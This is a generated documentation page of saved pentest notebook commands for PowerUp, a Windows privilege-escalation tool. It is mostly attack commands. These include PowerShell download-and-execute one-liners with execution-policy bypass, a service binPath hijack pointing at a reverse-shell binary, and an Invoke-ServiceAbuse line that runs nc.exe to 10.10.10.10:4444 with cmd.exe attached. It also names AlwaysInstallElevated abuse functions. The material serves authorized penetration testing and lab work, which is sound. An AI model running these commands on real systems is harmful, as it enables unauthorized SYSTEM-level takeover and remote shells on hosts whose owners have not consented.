---
title: "PowerUp"
sidebarTitle: "PowerUp"
description: "Commands and examples collected from your PowerUp notes."
keywords: ["PowerUp", "Invoke-ServiceAbuse", "Get-RegistryAlwaysInstallElevated", "Write-UserAddMSI"]
boost: 10
hideFooterPagination: true
---

{/* Generated from Commands/powerup.md. Edit the Markdown source, then run scripts/sync_site.py. */}

[Search this tool’s saved examples](/commands/notebook?tool=powerup) · [All tools](/index)

## Tools

**Notebook example**

```powershell
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

Saved as written; may include lab values or terminal output.

[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)

## Notebook recipes

5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.

<AccordionGroup>

<Accordion title="E. Service &amp; path abuse (normal-user → SYSTEM)">

### E. Service & path abuse (normal-user → SYSTEM)

**Windows Post-Exploitation: Field Reference**

```cmd
sc qc <service>                                  :: inspect
sc config <service> binPath= "C:\Temp\rev.exe"   :: if you have SERVICE_CHANGE_CONFIG
sc stop <service> & sc start <service>
:: PowerUp automates discovery + abuse:
powershell -ep bypass -c ". .\PowerUp.ps1; Invoke-AllChecks"
```

</Accordion>

<Accordion title="PHASE B — PrivEsc enumeration">

### PHASE B — PrivEsc enumeration

**Windows Post-Exploitation: Field Reference**

```powershell
# PowerUp (PowerShell) — service/permission abuse finder
. .\PowerUp.ps1 ; Invoke-AllChecks
# Seatbelt — host survey
.\Seatbelt.exe -group=all
# WES-NG (run offline on Kali against systeminfo output) — kernel exploit suggester
systeminfo > sysinfo.txt    # then on Kali: wes.py sysinfo.txt
```

</Accordion>

<Accordion title="EoP - Unquoted Service Paths">

### EoP - Unquoted Service Paths

**Windows Privilege Escalation: Full Checklist**

```powershell
# find the vulnerable application
C:\> powershell.exe -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('https://your-site.com/PowerUp.ps1'); Invoke-AllChecks"

...
[*] Checking for unquoted service paths...
ServiceName   : BBSvc
Path          : C:\Program Files\Microsoft\Bing Bar\7.1\BBSvc.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -ServiceName 'BBSvc' -Path <HijackPath>
...

# automatic exploit
Invoke-ServiceAbuse -Name [SERVICE_NAME] -Command "..\..\Users\Public\nc.exe 10.10.10.10 4444 -e cmd.exe"
```

</Accordion>

<Accordion title="AlwaysInstallElevated">

### AlwaysInstallElevated

**Windows Privilege Escalation: Full Checklist**

Context from the notebook: PowerUp.ps1 :  Get-RegistryAlwaysInstallElevated ,  Write-UserAddMSI

```text
Get-RegistryAlwaysInstallElevated
```

**Windows Privilege Escalation: Full Checklist**

Context from the notebook: PowerUp.ps1 :  Get-RegistryAlwaysInstallElevated ,  Write-UserAddMSI

```text
Write-UserAddMSI
```

</Accordion>

</AccordionGroup>
